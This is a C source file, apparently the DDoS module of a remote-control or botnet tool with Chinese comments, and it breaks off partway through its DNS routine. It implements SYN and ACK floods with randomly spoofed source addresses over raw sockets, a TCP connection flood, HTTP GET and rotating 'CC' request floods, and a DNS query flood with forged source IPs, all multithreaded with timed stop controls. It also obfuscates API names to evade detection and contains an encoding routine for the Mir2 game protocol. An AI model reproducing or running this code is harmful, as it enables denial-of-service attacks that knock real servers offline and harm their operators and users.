
#include "ddos.h"

#define nBufferSize 1024 //UDP 数据包大小
static char pSendBuffer[nBufferSize+60]; //数据大小+封装数据包

char  tgtIP[255];  //IP
char  tgtNDS[500];  //DNS地址
int	  tgtPort;     //端口
int	  stoptime;    //停止时间
int	  CC1;     //CC参数1
int	  CC2;    //CC参数2

static int  iTotalSize=0; //数据包+IP头+UDP头大小和

HANDLE h[MAX_PATH];  //线程号
const char table[]={'0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','\0'};
//传奇随即生成帐号

//--------------------攻击控制------------------------------------

bool stopfuck;  //停止DDOS

//--------------------计算校验和--------------------------------------
USHORT checksum(USHORT *buffer, int size)
{ 
	unsigned long cksum=0;
	while(size >1)
	{
		cksum+=*buffer++;
		size -=sizeof(USHORT);
	}
	if(size)
	{
		cksum += *(UCHAR*)buffer;
	}
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >>16);
	return (USHORT)(~cksum);
}

//---------------------自定义的随机数发生器----------------------------------
int SEU_Rand(int ran)
{	
	unsigned long Time=GetTickCount();
	int seed=rand()+3;
	seed=(seed*Time)%ran;
	return seed;
}

//-------------------- Mir2攻击函数--------------------------------------------
int Mir2EnCode(BYTE *pInBuff,DWORD dwInLen,BYTE *pOut,DWORD dwOutLen)
{
	DWORD var_20 = 0; 
	BYTE  var_1B = 0; 
	BYTE  var_1A = 0; 
	BYTE  var_19 = 0; 
	DWORD var_18 = 0; 
	DWORD var_14 = 0; 
	DWORD var_10 = 0; 
	DWORD var_C = 0; 
	DWORD var_8 = 0; 
	DWORD var_4 = 0;  
	BYTE bAL = 0; 
	BYTE bCL = 0; 
	DWORD dwEAX; 
	DWORD dwEDX; 
	DWORD dwECX;  
	var_20 = dwInLen ; 
	while(var_20 >0) 
	{  
		dwEDX = var_10 ;  
		bAL = pInBuff[dwEDX];  
		var_1A = bAL ;  
		dwECX = var_14 ;  
		dwECX = dwECX +2;  
		bAL = var_1A;  
		dwEAX = bAL ;  
		dwEAX = dwEAX >> dwECX ;  
		bAL = dwEAX ;  
		bAL = bAL | var_1B;   
		bAL = bAL & 0x3F;  
		var_19 = bAL;    
		dwEAX = var_14 ;  
		dwEAX = dwEAX +2;  
		dwECX = 8;  
		dwECX = dwECX - dwEAX ;  
		bAL = var_1A;  
		dwEAX = bAL ;  
		dwEAX = dwEAX << dwECX ;  
		dwEAX = dwEAX >> 2;  
		bAL = dwEAX ;  
		bAL = bAL & 0x3F ;  
		var_1B = bAL ;  
		var_14 = var_14 +2;  
		if(var_14<6)  
		{   
			dwEDX = var_18;   
			bCL = var_19;   
			bCL = bCL + 0x3C ;   
			pOut[dwEDX] = bCL ;   
			var_18 = var_18 +1;  
		}  
		else  
		{   
			dwEDX = var_18;   
			bCL = var_19;   
			bCL = bCL + 0x3C ;   
			pOut[dwEDX] = bCL ;   
			dwEDX = var_18 ;   
			bCL = var_1B ;   
			bCL = bCL + 0x3C;   
			pOut[dwEDX+1] = bCL ;   
			var_18 = var_18 + 2;   
			dwEAX =  0;   
			var_14 = 0;   
			var_1B = 0;  
		}  
		var_10 = var_10 +1;  
		var_20 = var_20 -1; 
	}  
	if(var_14 > 0) 
	{  
		dwEDX = var_18;  
		bCL = var_1B;  
		bCL = bCL + 0x3C ; 
		pOut[dwEDX] = bCL ;  
		var_18 = var_18 +1; 
	} 
	dwOutLen = var_18; 
	pOut[var_18]=0;
	return 1;
}

//-----------------------------------------------------------------------------------

#define ICMP_ECHO        8
#define MAX_PACKET       4096

const char icmpBuffer[4000]=//数据
"GET !@#$%.htm"
"GET %$#@!.asp"
"GET ^&*().html"
"GET !@#$%.htm"
"GET %$#@!.asp"
"GET ^&*().html"
"GET %$#@!.asp"
"GET ^&*().html"
"GET !@#$%.htm"
"GET %$#@!.asp"
"GET ^&*().html"
"GET %$#@!.asp"
"GET ^&*().html"
"GET %$#@!.asp"
"GET !@#$%.htm"
"GET !@#$%.htm"
"GET %$#@!.asp"
"GET ^&*().html"
"GET !@#$%.htm"
"GET %$#@!.asp"
"GET !@#$%.htm"
"GET %$#@!.asp"
"GET ^&*().html"
"GET !@#$%.htm"
"GET %$#@!.asp"
"GET ^&*().html"
"GET %$#@!.asp"
"GET ^&*().html"
"GET !@#$%.htm"
"GET %$#@!.asp"
"GET ^&*().html"
"GET %$#@!.asp"
"GET ^&*().html"
"GET %$#@!.asp"
"GET !@#$%.htm"
"GET !@#$%.htm"
"GET %$#@!.asp"
"GET ^&*().html"
"GET !@#$%.htm"
"GET %$#@!.asp"
"GET !@#$%.htm"
"GET %$#@!.asp"
"GET ^&*().html"
"GET !@#$%.htm"
"GET %$#@!.asp"
"GET ^&*().html"
"GET %$#@!.asp"
"GET ^&*().html"
"GET !@#$%.htm"
"GET %$#@!.asp"
"GET ^&*().html"
"GET %$#@!.asp"
"GET ^&*().html"
"GET %$#@!.asp"
"GET !@#$%.htm"
"GET !@#$%.htm"
"GET %$#@!.asp"
"GET ^&*().html"
"GET !@#$%.htm"
"GET %$#@!.asp"
"GET !@#$%.htm"
"GET %$#@!.asp"
"GET ^&*().html"
"GET !@#$%.htm"
"GET %$#@!.asp"
"GET ^&*().html"
"GET %$#@!.asp"
"GET ^&*().html"
"GET !@#$%.htm"
"GET %$#@!.asp"
"GET ^&*().html"
"GET %$#@!.asp"
"GET ^&*().html"
"GET %$#@!.asp"
"GET !@#$%.htm"
"GET !@#$%.htm"
"GET %$#@!.asp"
"GET ^&*().html"
"GET !@#$%.htm"
"GET ~!@#$%^&*())(*&^%$#@!ABCDEFGHIJKLMN!@#$%^.asp";

//------------------------------------将字符串转换成IP地址------------------------------------------------------------
unsigned long resolve(char *host)
{
	long i; 
	struct hostent *he; 
	
	if((i=inet_addr(host))<0) 
		
		if((he=(struct hostent*)gethostbyname(host))==NULL)
			return(0);
		else
			return(*(unsigned long *)he->h_addr);
		
		return(i);
}

//------------------------------------时间线程停止--------------------------------------------------------------------

DWORD WINAPI DdosTime(LPVOID lParam)//线程连接
{
    for(int i =0;i<900;i++)//以循环判断是否停止 停止的话线程也结束把 循环需要时间
	{
		if (!stopfuck)//如果已经停止了 就停止
		Sleep(stoptime*60);//这样就以分钟计算
	}
	stopfuck=true;
	return 0; 
}

//-----------------------SYN Flood		==2		暴风7.0-------------------------------------
unsigned long  CALLBACK synflood(LPVOID dParam)
{
	SOCKET    SendSocket; 
	IP_HEADER    ip_header; 
	TCP_HEADER   tcp_header; 
	PSD_HEADER   psd_header; 
	
	char rawip[20]={'1','9','2','.','1','6','8','.','1','.','2','2','4','\0'};
	char SendBuff[100];
	
	SendSocket = WSASocket( AF_INET, SOCK_RAW, IPPROTO_RAW, NULL, 0, WSA_FLAG_OVERLAPPED ); 
	if( SendSocket == INVALID_SOCKET ) 
		return 0; 
	
	SOCKADDR_IN    Sin;
	Sin.sin_family = AF_INET; 
	Sin.sin_port = htons(tgtPort); 
	Sin.sin_addr.S_un.S_addr=resolve(tgtIP);
	
	
	ip_header.h_verlen = (4<<4 | sizeof(ip_header)/sizeof(unsigned long)); 
	ip_header.tos = 0; 
	ip_header.total_len = htons(sizeof(ip_header)+sizeof(tcp_header)); 
	ip_header.ident = 1; 
	ip_header.frag_and_flags = 0x40; 
	ip_header.ttl = SEU_Rand(256); 
	ip_header.proto = IPPROTO_TCP;
	ip_header.checksum = 0; 
	ip_header.sourceIP = inet_addr(rawip); 
	ip_header.destIP = resolve(tgtIP); 
	
	//填充TCP首部 
	tcp_header.th_sport = htons( SEU_Rand(60000) + 1 );
	tcp_header.th_dport = htons( tgtPort ); 
	tcp_header.th_seq = htonl( SEU_Rand(900000000) + 1 ); 
	tcp_header.th_ack = 0; 
	tcp_header.th_lenres = (sizeof(tcp_header)/4<<4|0); 
	tcp_header.th_flag = 2;
	tcp_header.th_win = htons(512); 
	tcp_header.th_sum = 0; 
	tcp_header.th_urp = 0; 
	
	psd_header.saddr = ip_header.sourceIP; 
	psd_header.daddr = ip_header.destIP; 
	psd_header.mbz = 0; 
	psd_header.ptcl = IPPROTO_TCP; 
	psd_header.tcpl = htons(sizeof(tcp_header));
	
	while (1)
	{		
		if(stopfuck==1)
		{
			ExitThread(0);
			return 0;
		}
		for(int a=0;a<15;a++)
		{
			wsprintf(rawip, "%d.%d.%d.%d",SEU_Rand(250)+1,SEU_Rand(250)+1,SEU_Rand(250)+1,SEU_Rand(250)+1);
			ip_header.checksum = 0; 
			ip_header.ttl = SEU_Rand(256); 
			ip_header.sourceIP = inet_addr(rawip);
			
			tcp_header.th_sum = 0; 
			tcp_header.th_sport = htons( SEU_Rand(60000) + 1 );
			tcp_header.th_seq = htonl( SEU_Rand(900000000) + 1 ); 
			
			psd_header.saddr = ip_header.sourceIP;
			
			memcpy(SendBuff,&psd_header,sizeof(psd_header)); 
			memcpy(SendBuff+sizeof(psd_header),&tcp_header,sizeof(tcp_header)); 
			tcp_header.th_sum=checksum((USHORT*)SendBuff,sizeof(psd_header)+sizeof(tcp_header)); 
			
			memcpy(SendBuff,&ip_header,sizeof(ip_header)); 
			memcpy(SendBuff+sizeof(ip_header),&tcp_header, sizeof(tcp_header)); 
			ip_header.checksum=checksum((USHORT*)SendBuff,sizeof(ip_header)+sizeof(tcp_header)); 
			
			memcpy(SendBuff,&ip_header,sizeof(ip_header)); 
			memcpy(SendBuff+sizeof(ip_header),&tcp_header,sizeof(tcp_header));
			
			sendto(SendSocket, SendBuff, sizeof(ip_header) + sizeof(tcp_header), 0, (struct sockaddr *) &Sin, sizeof(Sin));
		}
		Sleep(10);
	}
	ExitThread(0);
	return 0;
}

void SYN_FLOOD(char ip[30],int port,int time,int xc)
{
    if (inet_addr(ip)== INADDR_NONE)
	{
		struct hostent *hp = NULL;
		if ((hp = gethostbyname(ip)) != NULL)
		{
			in_addr in;
			memcpy(&in, hp->h_addr, hp->h_length);
			strcpy(tgtIP,inet_ntoa(in));
		}
	}
	else
		strcpy(tgtIP,ip);

	tgtPort = port;
	stoptime = time;
	if (stoptime!=0)
	{
		CloseHandle(CreateThread(NULL,NULL,DdosTime,NULL,NULL,NULL));//激活
	}
	stopfuck=false;//TRUE停止攻击
	for(int i=0;i<xc;i++)
	{
	    //创建攻击线程
		h[i]=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)synflood, NULL, 0, NULL);
	}
}

//---------------------------------TCP Connect	==4		暴风5.5----------------------------------------------------
unsigned long  CALLBACK connect_break(LPVOID dParam)
{
	WSADATA               WSAData;
	WSAStartup(MAKEWORD(2,2) ,&WSAData);
	SOCKADDR_IN sockAddr;
	SOCKET	m_hSocket;
	
	memset(&sockAddr,0,sizeof(sockAddr));
	sockAddr.sin_family = AF_INET;
	sockAddr.sin_port=htons(tgtPort);
	sockAddr.sin_addr.S_un.S_addr=inet_addr(tgtIP);
	
	while(!stopfuck)
	{
		m_hSocket = socket(PF_INET,SOCK_STREAM,0);
		
		connect(m_hSocket,(SOCKADDR*)&sockAddr, sizeof(sockAddr));
		Sleep(40);
		closesocket(m_hSocket);
	}
    ExitThread(0);
	return 0;
}

void TCP_CONNECT(char ip[30],int port,int time,int xc)
{	
	if (inet_addr(ip)== INADDR_NONE)   //转换IP地址
	{
		struct hostent *hp = NULL;
	    if ((hp = gethostbyname(ip)) != NULL)
		{
			in_addr in;
			memcpy(&in, hp->h_addr, hp->h_length);
			strcpy(tgtIP,inet_ntoa(in));
		}
	}
	else
		strcpy(tgtIP,ip);

	tgtPort = port;   //目标端口
	stoptime = time;
	if (stoptime!=0)
	{
		CloseHandle(CreateThread(NULL,NULL,DdosTime,NULL,NULL,NULL));//激活
	}
    stopfuck=false;
	for(int i =0;i<xc;i++)
	{
		h[i]=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)connect_break, NULL, 0, NULL);
	}
	return ;
}

//------------------------------------ACK流量		==6		暴风7.0-------------------------------------
unsigned long  CALLBACK ackattack(LPVOID dParam)
{
	SOCKET    SendSocket; 
	IP_HEADER    ip_header; 
	TCP_HEADER   tcp_header; 
	PSD_HEADER   psd_header; 
	
	char rawip[20]={'1','9','2','.','1','6','8','.','1','.','2','2','4','\0'};
	char SendBuff[100];
	
	SendSocket = WSASocket( AF_INET, SOCK_RAW, IPPROTO_RAW, NULL, 0, WSA_FLAG_OVERLAPPED ); 
	if( SendSocket == INVALID_SOCKET ) 
		return 0;
	
	SOCKADDR_IN    Sin;
	Sin.sin_family = AF_INET; 
	Sin.sin_port = htons(tgtPort); 
	Sin.sin_addr.S_un.S_addr=resolve(tgtIP);
	
	ip_header.h_verlen = (4<<4 | sizeof(ip_header)/sizeof(unsigned long)); 
	ip_header.tos = 0; 
	ip_header.total_len = htons(sizeof(ip_header)+sizeof(tcp_header)); 
	ip_header.ident = 1; 
	ip_header.frag_and_flags = 0x40; 
	ip_header.ttl = SEU_Rand(256); 
	ip_header.proto = IPPROTO_TCP;
	ip_header.checksum = 0; 
	ip_header.sourceIP = inet_addr(rawip); 
	ip_header.destIP = resolve(tgtIP); 
	
	//填充TCP首部 
	tcp_header.th_sport = htons( SEU_Rand(60000) + 1 );
	tcp_header.th_dport = htons( tgtPort ); 
	tcp_header.th_seq = htonl( SEU_Rand(900000000) + 1 ); 
	tcp_header.th_ack = 0; 
	tcp_header.th_lenres = (sizeof(tcp_header)/4<<4|0); 
	tcp_header.th_flag = 4;
	tcp_header.th_win = htons(512); 
	tcp_header.th_sum = 0; 
	tcp_header.th_urp = 0; 
	
	psd_header.saddr = ip_header.sourceIP; 
	psd_header.daddr = ip_header.destIP; 
	psd_header.mbz = 0; 
	psd_header.ptcl = IPPROTO_TCP; 
	psd_header.tcpl = htons(sizeof(tcp_header)); 	
	
	memcpy(SendBuff,&psd_header,sizeof(psd_header)); 
	memcpy(SendBuff+sizeof(psd_header),&tcp_header,sizeof(tcp_header)); 
	tcp_header.th_sum=checksum((USHORT*)SendBuff,sizeof(psd_header)+sizeof(tcp_header)); 
	
	memcpy(SendBuff,&ip_header,sizeof(ip_header)); 
	memcpy(SendBuff+sizeof(ip_header),&tcp_header, sizeof(tcp_header)); 
	memset(SendBuff+sizeof(ip_header)+sizeof(tcp_header),0,4); 
	ip_header.checksum=checksum((USHORT*)SendBuff,sizeof(ip_header)+sizeof(tcp_header)); 
	
	memcpy(SendBuff,&ip_header,sizeof(ip_header)); 
	memcpy(SendBuff+sizeof(ip_header),&tcp_header,sizeof(tcp_header));
	
	while (1)
	{		
		if(stopfuck==1)
		{
			ExitThread(0);
			return 0;
		}
		for(int a=0;a<15;a++)
		{
			wsprintf(rawip, "%d.%d.%d.%d",SEU_Rand(250)+1,SEU_Rand(250)+1,SEU_Rand(250)+1,SEU_Rand(250)+1);
			ip_header.checksum = 0; 
			ip_header.ttl = SEU_Rand(256); 
			ip_header.sourceIP = inet_addr(rawip);
			
			tcp_header.th_sum = 0; 
			tcp_header.th_sport = htons( SEU_Rand(60000) + 1 );
			tcp_header.th_seq = htonl( SEU_Rand(900000000) + 1 ); 
			
			psd_header.saddr = ip_header.sourceIP;
			
			memcpy(SendBuff,&psd_header,sizeof(psd_header)); 
			memcpy(SendBuff+sizeof(psd_header),&tcp_header,sizeof(tcp_header)); 
			tcp_header.th_sum=checksum((USHORT*)SendBuff,sizeof(psd_header)+sizeof(tcp_header)); 
			
			memcpy(SendBuff,&ip_header,sizeof(ip_header)); 
			memcpy(SendBuff+sizeof(ip_header),&tcp_header, sizeof(tcp_header));  
			ip_header.checksum=checksum((USHORT*)SendBuff,sizeof(ip_header)+sizeof(tcp_header)); 
			
			memcpy(SendBuff,&ip_header,sizeof(ip_header)); 
			memcpy(SendBuff+sizeof(ip_header),&tcp_header,sizeof(tcp_header));
			
			sendto(SendSocket, SendBuff, sizeof(ip_header) + sizeof(tcp_header), 0, (struct sockaddr *) &Sin, sizeof(Sin));
		}
		Sleep(10);
	}
	closesocket(SendSocket);
	WSACleanup();
	return 0; 
}

void ACK_FLOOD(char ip[30],int port,int time,int xc)
{
	if (inet_addr(ip)== INADDR_NONE)   //转换IP
	{
		struct hostent *hp = NULL;
		if ((hp = gethostbyname(ip)) != NULL)
		{
			in_addr in;
			memcpy(&in, hp->h_addr, hp->h_length);
			strcpy(tgtIP,inet_ntoa(in));
		}
	}
	else
		strcpy(tgtIP,ip);
	
	tgtPort=port;    //端口
	stoptime = time;
	if (stoptime!=0)
	{
		CloseHandle(CreateThread(NULL,NULL,DdosTime,NULL,NULL,NULL));//激活
	}	
	stopfuck=false;//TRUE停止攻击

	for(int i=0;i<xc;i++)//这个碎片也恢复原始线程
	{
		h[i]=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ackattack, NULL, 0, NULL);
	}
}

//---------------------------------------HTTP Get协议	==10	DK代码-------------------------------------------------
bool doHTTP(char* ServerName,DWORD port,char* ActionFile,  char* Method,char* HttpHeaders, char* FormData)
{
	HMODULE hDll;
	LPVOID hSession,hConnect,hRequest; 
	bool bSendRequest=false;
	char buf[1000];
	DWORD dwFlags;

	hDll = LoadLibrary("wininet.dll");
	if(hDll)
	{
		typedef LPVOID ( WINAPI * pInternetOpen ) (LPCTSTR ,DWORD ,LPCTSTR ,LPCTSTR ,DWORD );
		typedef LPVOID ( WINAPI * pInternetConnect ) ( LPVOID ,LPCTSTR ,WORD ,LPCTSTR ,LPCTSTR ,DWORD ,DWORD ,DWORD);
		typedef LPVOID ( WINAPI * pHttpOpenRequest ) ( LPVOID ,LPCTSTR ,LPCTSTR ,LPCTSTR ,LPCTSTR ,LPCSTR FAR *  ,DWORD ,DWORD);
		typedef BOOL ( WINAPI * pHttpSendRequest ) (LPVOID ,LPCSTR ,DWORD ,LPVOID,DWORD) ;
		typedef BOOL ( WINAPI * pInternetReadFile ) (LPVOID ,LPVOID ,DWORD ,LPDWORD) ;
		typedef BOOL ( WINAPI * pInternetCloseHandle ) ( LPVOID );

		pInternetOpen InternetOpen=NULL;
	    pInternetConnect InternetConnect=NULL;
		pHttpOpenRequest HttpOpenRequest=NULL;
		pHttpSendRequest HttpSendRequest=NULL;
		pInternetCloseHandle InternetCloseHandle=NULL;
		pInternetReadFile InternetReadFile=NULL;
		
		char viidf[] = {'I','n','t','e','r','n','e','t','O','p','e','n','A','\0'};
		char GAhGz[] = {'I','n','t','e','r','n','e','t','C','o','n','n','e','c','t','A','\0'};
		char mBVIf[] = {'H','t','t','p','O','p','e','n','R','e','q','u','e','s','t','A','\0'};
		char dQiXD[] = {'H','t','t','p','S','e','n','d','R','e','q','u','e','s','t','A','\0'};
		char CYmQT[] = {'I','n','t','e','r','n','e','t','C','l','o','s','e','H','a','n','d','l','e','\0'};
		char BbLLZ[] = {'I','n','t','e','r','n','e','t','R','e','a','d','F','i','l','e','\0'};

	    InternetOpen = ( pInternetOpen ) GetProcAddress( hDll, viidf );
		InternetConnect = (pInternetConnect ) GetProcAddress ( hDll, GAhGz);
		HttpOpenRequest = (pHttpOpenRequest) GetProcAddress (hDll, mBVIf);
		HttpSendRequest = ( pHttpSendRequest ) GetProcAddress( hDll, dQiXD );
		InternetCloseHandle = (pInternetCloseHandle) GetProcAddress (hDll, CYmQT);
		InternetReadFile = (pInternetReadFile) GetProcAddress(hDll, BbLLZ);

		// 创建Internet
		char OrPjb[] = {'H','a','c','k','e','r','o','o','\0'};
		hSession = InternetOpen(OrPjb,0, NULL, NULL, 0);
		if (hSession != NULL)
		{
			// 连接服务器
			hConnect = InternetConnect(hSession,ServerName,(WORD)port, NULL, NULL, 3, 0, 1);
			if (hConnect!= NULL)
			{
				// 创建一个请求
				LPTSTR AcceptTypes[2]={"*/*",NULL};
				char TCAvk[] = {'H','T','T','P','/','1','.','1','\0'};
				hRequest = HttpOpenRequest(hConnect,Method,ActionFile,TCAvk,NULL,(LPCTSTR*)AcceptTypes,0, 1);
				if (hRequest!= NULL)
				{

					// 发送请求
					bSendRequest =HttpSendRequest(hRequest,HttpHeaders,strlen(HttpHeaders),FormData,strlen(FormData));
					if (bSendRequest)
					{
						memset(buf,0,1000);
						InternetReadFile(hRequest, buf,999, &dwFlags);
					}
				}
			}
			// 清除句柄
			if (hRequest)
				InternetCloseHandle(hRequest);
			if (hConnect)
				InternetCloseHandle(hConnect);
			if (hSession)
				InternetCloseHandle(hSession);
		}
		FreeLibrary(hDll);
	}
	return bSendRequest;
}

unsigned long  CALLBACK rstflood(LPVOID dParam)
{
	char all[100],ip[32],port[6],url[32],*point=NULL;
	int httpport=80;
	strcpy(all,tgtIP);
	point=all;
	char PnDFs[] = {'h','t','t','p',':','/','/','\0'};
	if(strstr(all,PnDFs)!=NULL)
	{
		point=point+strlen(PnDFs);
	}
	if(strstr(point,":")!=NULL)
	{
		memset(ip,0,sizeof(ip));
		strncpy(ip,point,strcspn(point,":"));
		point=point+strcspn(point,":")+1;
		if(strstr(point,"/")!=NULL)
		{
			memset(port,0,sizeof(port));
			strncpy(port,point,strcspn(point,"/"));
			httpport=atoi(port);
			point=point+strcspn(point,"/");
			memset(url,0,sizeof(url));
			strcpy(url,point);
		}
	}
	else
	{
		if(strstr(point,"/")!=NULL)
		{
			
			memset(ip,0,sizeof(ip));
			strncpy(ip,point,strcspn(point,"/"));
			point=point+strcspn(point,"/");
			memset(url,0,sizeof(url));
			strcpy(url,point);
		}
	}
	
	char FeAwT[] = {'^','*','%','%','R','F','T','G','Y','H','J','I','R','T','G','*','(','&','^','%','D','F','G','.','a','s','p','\0'};

	if (strlen(url)<2)
	{
// 		strcpy(url,"^*%%RFTGYHJIRTG*(&^%DFG.asp");
		strcpy(url,FeAwT);
	}
	
    httpport=tgtPort;
	while(!stopfuck)
	{
		doHTTP(ip,
			httpport,
			url,
			"GET",
			"Cache-Control: no-cache\r\nReferer: www.qq.com\r\n",
			"");
		Sleep(40);
	}
    ExitThread(0);
	return 0;
}

void RST_FLOOD(char ip[30],int port,int time,int xc)
{
	strcpy(tgtIP,ip);

 	tgtPort = port;   //目标端口
	stoptime = time;
	if (stoptime!=0)
	{
		CloseHandle(CreateThread(NULL,NULL,DdosTime,NULL,NULL,NULL));//激活
	}
	stopfuck=false;//TRUE停止攻击

	for(int i=0;i<xc;i++)  //循环创建线程
	{
		h[i]=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)rstflood, NULL, 0, NULL);  //具体攻击
	}
}

//---------------------------分布式循环CC	==11	DK代码-------------------------------------
unsigned long  CALLBACK Ren_CC(LPVOID dParam)
{
	SOCKET	MySocket;//套接字
	char     strTemp[0x400]={0};
	char     strHost[MAX_PATH]={0};
	char     strParam[MAX_PATH]={0};
	char    *pstrTemp=NULL;
	char    *pstrTemp2=NULL;
	BYTE     byBuffer[1024*2]={0};
	int      nTemp;
	int      nCount;
	
	char GvoSM[] = {'h','t','t','p',':','/','/','\0'};
	strcpy(strTemp,tgtIP);
    if ( strstr(strTemp, GvoSM) )
		pstrTemp = strTemp+strlen(GvoSM);
	
	if ( strstr(pstrTemp, "/") )
	{
		memset(strHost, 0, sizeof(strHost));
		nTemp = strcspn(pstrTemp, "/");
		strncpy(strHost, pstrTemp, nTemp);
		pstrTemp2 = &pstrTemp[strcspn(pstrTemp, "/")];
		memset(strParam, 0, sizeof(strParam));
		strcpy(strParam, pstrTemp2);
	}
    if ( strlen(strParam)< 2 )
		strcpy(strParam, "/");
	
	SOCKADDR_IN MySockaddr;	//IP信息结构
	memset(&MySockaddr,0,sizeof(MySockaddr)); //内存空间初始化
	MySockaddr.sin_family = AF_INET;   //代协议族,在socket编程中只能是AF_INET
	MySockaddr.sin_port=htons(tgtPort);  //存储端口号(使用网络字节顺序)
	MySockaddr.sin_addr.S_un.S_addr=resolve(strHost);  //将网络地址转换成IP地址

	nCount=CC1;
	while (!stopfuck)
	{
		sprintf(strTemp,strParam,nCount++);
		if (nCount>CC2)
		{
			nCount=CC1;
		}
		wsprintfA(
        (char *)byBuffer,
        "GET %s HTTP/1.1\r\nAccept: */*\r\nAccept-Language: zh-cn\r\nAccept-Encoding: gzip, deflate\r\nHost: %s:%d\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows 5.1)\r\nReferer: http://%s\r\nConnection: Keep-Alive\r\n\r\n",
        strTemp,
        strHost,
        tgtPort,
        strHost);
        int nbufSize=strlen((char*)byBuffer);
		MySocket = socket(2, 1, 6);
		if ( connect(MySocket, (SOCKADDR*)&MySockaddr, 16) != -1 )
		{
			nTemp=1;
			setsockopt(MySocket, 6, 1,(const char *)&nTemp, sizeof(nTemp));
			nTemp=0;
			setsockopt(MySocket, SOL_SOCKET ,SO_SNDBUF, (const char *)&nTemp, sizeof(nTemp));
			for (int i=0;i<10;i++)
			{
				send(MySocket, (char*)byBuffer,nbufSize, 0);
				Sleep(1);
			}
			closesocket(MySocket);
			Sleep(30);
		}
	}
	closesocket(MySocket);
    ExitThread(0);
	return 0;
}

void LX_CC(char ip[30],int port,int time,int xc,int iext1,int iext2)
{
	strcpy(tgtIP,ip);
	
	tgtPort = port;   //目标端口
	CC1 = iext1;  
	CC2 = iext2;  
	stoptime = time;
	if (stoptime!=0)
	{
		CloseHandle(CreateThread(NULL,NULL,DdosTime,NULL,NULL,NULL));//激活
	}
    stopfuck=false;
	for(int i =0;i<xc*2;i++)
	{
		h[i]=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Ren_CC, NULL, 0, NULL);
	}
	return ;
}

//////////////////////////////////////////////////////////////DNS///////////////////////////////////////////////////////////////////////
BOOL toDnsString(char *strDnsName)
{
	if (strDnsName==NULL)
	{
        return FALSE;
	}
	char strTemp[MAX_PATH]={0};
	int nDnsNameCount=strlen(strDnsName);
	int nDnaNameIndex=0;
	strcpy(strTemp,strDnsName);
	ZeroMemory(strDnsName,nDnsNameCount);
	for (int i=0;i<nDnsNameCount;i++)
	{
		if (strTemp[i]=='.')
		{
			strDnsName[nDnaNameIndex]=i-nDnaNameIndex;
			int nTemp=nDnaNameIndex++;
			memcpy((BYTE*)strDnsName+nDnaNameIndex,strTemp+nTemp,i-nTemp);
			nDnaNameIndex+=(i-nTemp);
			if (!strchr(strTemp+nDnaNameIndex,'.'))      //如果没有 "."
			{
				strDnsName[nDnaNameIndex]=strlen(strTemp+nDnaNameIndex);
				//没有"."了 就把剩余的拷贝进来
				memcpy((BYTE*)strDnsName+(nDnaNameIndex+1),strTemp+nDnaNameIndex,strDnsName[nDnaNameIndex]);
				break;
			}
		}
	}
	return TRUE;
}

DWORD WINAPI DnsIpFlood(LPVOID lParam)
{
	// TODO: Place code here.
	WSADATA wsaData;
	MSGHEAD MsgHead;

	WSAStartup(MAKEWORD(2, 2), &wsaData);
	//--------------定义变量
	BOOL			bIphdrIncl = TRUE;
	SOCKET			s = INVALID_SOCKET;
	SOCKADDR_IN		Sin = {0}; 
	dns_msg			dns_data = {0};
	int				i = 2, j = 3, k = 4, nRet = 0;
	//---------------原始套接字
	s = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
	//---------------修改本地IP
	nRet = setsockopt(s, IPPROTO_IP, IP_HDRINCL, (const char *)&bIphdrIncl, sizeof(BOOL));
	//---------------填充目标地址及端口
	Sin.sin_addr.s_addr = resolve(tgtNDS); //目标ip
	Sin.sin_family=AF_INET;
	Sin.sin_port=htons(53);//DNS默认53
	
	while(!stopfuck)
	{
		for(i=97;i<123;i++)
			for(j=97;j<123;j++)
				for(k=97;k<123;k++)
				{
					//---------------填充伪装IP数据包
					dns_data.ip.ip_v = 4;
					dns_data.ip.ip_hl = (sizeof(ipheader)/4);
					dns_data.ip.ip_tos = 0;
					dns_data.ip.ip_id = rand();
					dns_data.ip.ip_off = 0;
					dns_data.ip.ip_ttl = 255;
					dns_data.ip.ip_p = IPPROTO_UDP;
					dns_data.ip.ip_sum = 0;
					dns_data.ip.ip_dst = Sin.sin_addr.s_addr;
					dns_data.ip.ip_src = inet_addr(tgtNDS);	//伪造源ip地址
					//---------------填充伪装UDP数据包
					dns_data.udp.port_dst=htons(53);
					dns_data.udp.port_src=htons(1024+(rand()%2000));//伪造源端口
					dns_data.udp.udp_len=htons(31);//htons(sizeof(struct dns_msg)-sizeof(struct ipheader));
					dns_data.udp.udp_sum=0;
					//---------------填充DNS数据包
					dns_data.dnshead.id=rand();
					dns_data.dnshead.rd=0;//不是期望递归，如没有授权回答就返回一个能回答的服务器列表
					dns_data.dnshead.ra=1;//可用递归 如果名字服务器支持递归，则在响应中把它置为1
					dns_data.dnshead.aa=0;//为1时授权回答 该名字服务器是授权于该域的
					dns_data.dnshead.tc=0; //为1时表示可截断的，当超过512字节时，只返回前512字节
					dns_data.dnshead.opcode= 0;//表示是标准询问包 0--标准查询 1--反向查询 2--服务器状态查询  3-15--未使用
					dns_data.dnshead.qdcount=htons(1);//查询的数量
					dns_data.dnshead.ancount=htons(0);//回答
					dns_data.dnshead.nscount=htons(0);//授权
					dns_data.dnshead.arcount=htons(0);//额外信息
					dns_data.dnshead.qr=0;//query bag
					//fill domain query  a.a.a的形式
					ZeroMemory(dns_data.dnsbuf,sizeof(dns_data.dnsbuf));
					if (k%2==0)
					{
						dns_data.dnsbuf[0] = 1;
						dns_data.dnsbuf[1] = i;
						dns_data.dnsbuf[2] = 1;
						dns_data.dnsbuf[3] = j;
						dns_data.dnsbuf[4] = 1;
						dns_data.dnsbuf[5] = k;
						dns_data.dnsbuf[6] = 0;
						dns_data.dnsbuf[8] = 1;
						dns_data.dnsbuf[10] = 1;
					}else{
						strcpy(dns_data.dnsbuf,tgtIP);//要查询的域名
						toDnsString(dns_data.dnsbuf);                   //这里将字符串序列化为dns格式
					}
					dns_data.dnshead.id=rand();
					//---------------重置校验和
